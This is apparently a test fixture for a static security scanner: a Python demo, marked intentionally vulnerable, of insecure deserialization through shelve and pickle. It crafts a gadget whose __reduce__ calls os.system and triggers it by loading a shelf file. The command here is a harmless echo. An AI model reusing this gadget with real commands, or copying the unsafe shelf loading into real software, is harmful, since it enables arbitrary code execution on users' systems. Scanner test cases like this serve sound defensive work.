# SPDX-FileCopyrightText: 2026-present Maikel Mardjan(https://nocomplexity.com/) and all contributors!
# SPDX-License-Identifier: GPL-3.0-or-later
# See for full license text: https://spdx.org/licenses/GPL-3.0-or-later.html or https://opensource.org/license/gpl-3.0 

import os
import sys
import shelve

# SAST Metadata
SAST_META = {
    "title": "Insecure Deserialization via Shelve (shelve.open / shelve.DbfilenameShelf)",
    "cwe_id": [502, 94],        # 502 deserialization of untrusted data,
                                # 94 improper control of code generation (code injection)
    "weakness": "Deserialization of Untrusted Data",
    "owasp": "A08:2021 - Software and Data Integrity Failures",
    "severity": "High",
    "cvss": 9.8,
    "impact": "High",
    "tags": ["shelve", "pickle", "deserialization", "rce", "code-execution",
             "untrusted-data", "python", "dbm"],
}


class Exploit:
    """Benign stand-in for a malicious pickle gadget.

    shelve stores values with pickle, so unpickling a shelf value invokes
    __reduce__ — arbitrary code runs before the caller sees the result.
    Here we print; a real gadget would call os.system / subprocess.Popen.
    """
    def __reduce__(self):
        return (os.system, ("echo 'arbitrary code executed via shelve/pickle'",))


def demo_shelve_open(path):
    """Sink 1: shelve.open on an attacker-supplied path."""
    print(f"[shelve.open] path={path!r}")
    # Vulnerable: untrusted shelf file -> pickle.load invoked on access
    with shelve.open(path) as db:
        # Accessing a key triggers pickle.load of the stored value
        val = db.get("payload")
        print(f"[shelve.open] returned: {val!r}")


def demo_dbfilename_shelf(path):
    """Sink 2: shelve.DbfilenameShelf — same engine, explicit constructor."""
    print(f"[DbfilenameShelf] path={path!r}")
    # Vulnerable: DbfilenameShelf is not a "safe" API — it is shelve's
    # underlying class, and value access still unpickles
    with shelve.DbfilenameShelf(path) as db:
        val = db.get("payload")
        print(f"[DbfilenameShelf] returned: {val!r}")


def craft_malicious_shelf(path):
    """Helper: write a shelf containing a malicious pickle payload."""
    with shelve.open(path) as db:
        db["payload"] = Exploit()


if __name__ == "__main__":
    print("[*] shelve deserialization sinks (intentionally vulnerable demo)")
    print("[*] shelve is backed by pickle; loading a shelf executes arbitrary code.\n")

    shelf_path = "/tmp/demo_shelf"
    craft_malicious_shelf(shelf_path)

    demo_shelve_open(shelf_path)
    print()
    demo_dbfilename_shelf(shelf_path)

    # Cleanup
    for ext in ("", ".db", ".dat", ".dir", ".bak"):
        try:
            os.remove(shelf_path + ext)
        except FileNotFoundError:
            pass

    print("\n[*] Safe alternative (for contrast): use JSON for untrusted data")
    import json
    safe = json.loads('{"user": "alice", "role": "viewer"}')
    print(f"    json.loads -> {safe}  (no code execution possible)")